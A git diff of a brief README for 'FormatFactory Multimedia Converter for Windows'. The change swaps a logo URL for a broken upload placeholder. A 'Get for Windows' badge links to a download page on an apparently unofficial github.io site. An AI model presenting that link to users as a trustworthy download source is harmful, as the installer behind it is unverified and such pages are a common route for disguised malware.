@@ -1,7 +1,8 @@
 
 # FormatFactory Multimedia Converter for Windows
 
-<img src="https://chatgpt.com/backend-api/estuary/content?id=file_00000000f3dc820a8fbfab4d80db253f&ts=495687&p=fs&cid=1&sig=8f83fb70f29f7f5b5f406732c131500f698c4112e01f46aef80695a2640f3022&v=0" alt="Format Factory Logo" width="760">
+<img src="![Uploading image.png…]()
+" alt="Format Factory Logo" width="760">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://cmetankadd.github.io/.github/FormatFactory-Multimedia-Converter)
 
